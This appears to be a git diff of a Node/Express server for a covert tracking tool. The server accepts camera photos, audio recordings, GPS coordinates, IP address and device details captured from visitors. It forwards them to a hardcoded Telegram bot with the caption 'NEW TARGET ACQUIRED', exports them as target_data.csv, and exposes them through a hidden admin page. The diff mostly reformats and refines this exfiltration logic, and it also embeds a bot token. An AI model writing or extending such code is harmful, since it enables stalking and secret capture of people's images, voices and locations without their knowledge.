@@ -12,15 +12,8 @@ app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
-// ==========================================
-// TELEGRAM CONFIG
-// ==========================================
 const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
 const TELEGRAM_CHAT_ID = '5387196154';
-
-// ==========================================
-// ENCRYPTED ADMIN PASSWORD
-// ==========================================
 const ADMIN_PASSWORD_HASH = '$2b$10$WL/uVqDgR1Z94OoXTPzkTewSFsjqN8LiBrGwUEeoV1DdFbjvPJMO6';
 
 async function verifyPassword(plainPassword) {
@@ -32,24 +25,17 @@ async function verifyPassword(plainPassword) {
     }
 }
 
-// ==========================================
-// TELEGRAM FUNCTIONS
-// ==========================================
 async function sendTelegramPhoto(imageData, caption) {
     try {
         const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Image, 'base64');
-        
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', buffer, { filename: 'capture.jpg' });
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
-        
-        await axios.post(url, formData, {
-            headers: formData.getHeaders()
-        });
+        await axios.post(url, formData, { headers: formData.getHeaders() });
         console.log('✅ Telegram photo sent!');
     } catch (error) {
         console.error('❌ Telegram photo error:', error.message);
@@ -61,17 +47,13 @@ async function sendTelegramAudio(audioData, caption) {
     try {
         const base64Audio = audioData.replace(/^data:audio\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Audio, 'base64');
-        
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('audio', buffer, { filename: 'recording.webm' });
         formData.append('caption', caption || '🎤 Audio Recording');
         formData.append('parse_mode', 'HTML');
-        
-        await axios.post(url, formData, {
-            headers: formData.getHeaders()
-        });
+        await axios.post(url, formData, { headers: formData.getHeaders() });
         console.log('✅ Telegram audio sent!');
     } catch (error) {
         console.error('❌ Telegram audio error:', error.message);
@@ -93,9 +75,6 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ==========================================
-// DATA STORE
-// ==========================================
 let allData = [];
 let idCounter = 1;
 
@@ -107,9 +86,6 @@ app.get('/secret-admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
 
-// ==========================================
-// STORE DATA + TELEGRAM
-// ==========================================
 app.post('/api/store', async (req, res) => {
     try {
         const { 
@@ -137,65 +113,68 @@ app.post('/api/store', async (req, res) => {
         console.log('✅ Stored! Total:', allData.length);
 
         // ==========================================
-        // TELEGRAM CAPTION - REAL DATA ONLY!
+        // TELEGRAM CAPTION - SIRF REAL DATA!
         // ==========================================
         const device = fullDeviceInfo || deviceDetails || {};
         const loc = location || {};
         const speed = networkSpeed || {};
-        
-        // Build caption lines - sirf real data
+
         let captionLines = [];
         captionLines.push('🔴 <b>NEW TARGET ACQUIRED</b> 🔴');
-        
-        // Location - only if both lat and lng exist
-        if (loc.lat && loc.lng) {
+
+        // 1. LOCATION - only if real
+        if (loc.lat && loc.lng && loc.lat !== '—' && loc.lng !== '—') {
             captionLines.push(`📍 Location: ${loc.lat}, ${loc.lng}`);
         }
-        
-        // Device Name - only if real
-        let deviceName = device.manufacturer || '';
-        if (device.deviceModel && device.deviceModel !== '—' && device.deviceModel !== 'Unknown') {
-            deviceName += ' ' + device.deviceModel;
-        } else if (device.deviceName && device.deviceName !== '—' && device.deviceName !== 'Unknown') {
-            deviceName = device.deviceName;
+
+        // 2. DEVICE - only if REAL (not Unknown)
+        let deviceDisplay = '';
+        if (device.manufacturer && device.manufacturer !== 'Unknown' && device.manufacturer !== '—') {
+            deviceDisplay = device.manufacturer;
         }
-        if (deviceName.trim() && deviceName !== '—' && deviceName !== 'Unknown') {
-            captionLines.push(`📱 Device: ${deviceName.trim()}`);
+        if (device.deviceModel && device.deviceModel !== 'Unknown' && device.deviceModel !== '—' && !device.deviceModel.includes('Unknown')) {
+            deviceDisplay += ' ' + device.deviceModel;
         }
-        
-        // OS - only if real
-        if (device.os && device.os !== '—' && device.os !== 'Unknown') {
+        if (device.deviceName && device.deviceName !== 'Unknown' && device.deviceName !== '—' && !device.deviceName.includes('Unknown')) {
+            deviceDisplay = device.deviceName;
+        }
+        if (deviceDisplay.trim() && deviceDisplay !== 'Unknown' && deviceDisplay !== '—') {
+            captionLines.push(`📱 Device: ${deviceDisplay.trim()}`);
+        }
+
+        // 3. OS - only if REAL
+        if (device.os && device.os !== 'Unknown' && device.os !== '—') {
             let osStr = device.os;
-            if (device.osVersion && device.osVersion !== '—' && device.osVersion !== 'Unknown') {
+            if (device.osVersion && device.osVersion !== 'Unknown' && device.osVersion !== '—') {
                 osStr += ' ' + device.osVersion;
             }
             captionLines.push(`📲 OS: ${osStr}`);
         }
-        
-        // IP - only if real
-        if (ipAddress && ipAddress !== '—' && ipAddress !== 'Unknown') {
+
+        // 4. IP - only if real
+        if (ipAddress && ipAddress !== 'Unknown' && ipAddress !== '—') {
             captionLines.push(`📡 IP: ${ipAddress}`);
         }
-        
-        // Network - only if real
-        if (device.connection?.type && device.connection.type !== '—' && device.connection.type !== 'Unknown') {
+
+        // 5. Network - only if real
+        if (device.connection?.type && device.connection.type !== 'Unknown' && device.connection.type !== '—') {
             captionLines.push(`📶 Network: ${device.connection.type}`);
         }
-        
-        // Speed - only if real
-        if (speed.download && speed.download !== '—' && speed.download !== 'Unknown') {
+
+        // 6. Speed - only if real
+        if (speed.download && speed.download !== 'Unknown' && speed.download !== '—') {
             captionLines.push(`🚀 Speed: ${speed.download} Mbps`);
         }
-        
-        // Battery - only if real
-        if (device.battery?.level && device.battery.level !== '—' && device.battery.level !== 'Unknown') {
+
+        // 7. Battery - only if real
+        if (device.battery?.level && device.battery.level !== 'Unknown' && device.battery.level !== '—') {
             captionLines.push(`🔋 Battery: ${device.battery.level}`);
         }
-        
-        // Captures count
+
+        // 8. Captures & Time - always show
         captionLines.push(`📸 Captures: ${captureCount || 1}`);
         captionLines.push(`🕐 Time: ${new Date().toISOString()}`);
-        
+
         const caption = captionLines.join('\n');
 
         if (userPhoto) {
@@ -216,23 +195,14 @@ app.post('/api/store', async (req, res) => {
     }
 });
 
-// ==========================================
-// GET IP
-// ==========================================
 app.get('/api/get-ip', (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || 
-               req.connection.remoteAddress || 
-               '—';
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '—';
     res.json({ success: true, ip: ip });
 });
 
-// ==========================================
-// EXPORT CSV
-// ==========================================
 app.get('/api/export-csv', (req, res) => {
     try {
         let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
-        
         allData.forEach(item => {
             const device = item.fullDeviceInfo || item.deviceDetails || {};
             const row = [
@@ -250,7 +220,6 @@ app.get('/api/export-csv', (req, res) => {
             ];
             csv += row.join(',') + '\n';
         });
-
         res.setHeader('Content-Type', 'text/csv');
         res.setHeader('Content-Disposition', 'attachment; filename=target_data.csv');
         res.send(csv);
@@ -259,16 +228,11 @@ app.get('/api/export-csv', (req, res) => {
     }
 });
 
-// ==========================================
-// ADMIN
-// ==========================================
 app.post('/api/admin/get-data', async (req, res) => {
     try {
         const { password } = req.body;
-        
         console.log('🔑 Attempting login...');
         const isValid = await verifyPassword(password);
-        
         if (!isValid) {
             console.log('❌ Invalid password attempt');
             return res.status(401).json({ 
@@ -277,49 +241,30 @@ app.post('/api/admin/get-data', async (req, res) => {
                 error: 'Invalid credentials'
             });
         }
-        
         console.log('✅ Admin access granted');
-        res.json({ 
-            success: true, 
-            count: allData.length, 
-            data: allData 
-        });
-        
+        res.json({ success: true, count: allData.length, data: allData });
     } catch (err) {
         console.error('Admin error:', err);
-        res.status(500).json({ 
-            success: false, 
-            error: err.message 
-        });
+        res.status(500).json({ success: false, error: err.message });
     }
 });
 
 app.post('/api/admin/delete', async (req, res) => {
     try {
         const { password, id } = req.body;
-        
         const isValid = await verifyPassword(password);
-        
         if (!isValid) {
-            return res.status(401).json({ 
-                success: false, 
-                message: '⛔ ACCESS DENIED!' 
-            });
+            return res.status(401).json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
-        
         allData = allData.filter(item => item._id !== id);
         console.log('🗑️ Deleted:', id);
         res.json({ success: true, message: 'Deleted!' });
-        
     } catch (err) {
         console.error('Delete error:', err);
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
-// ==========================================
-// START SERVER
-// ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
     console.log(`🔑 Admin: /secret-admin.html`);
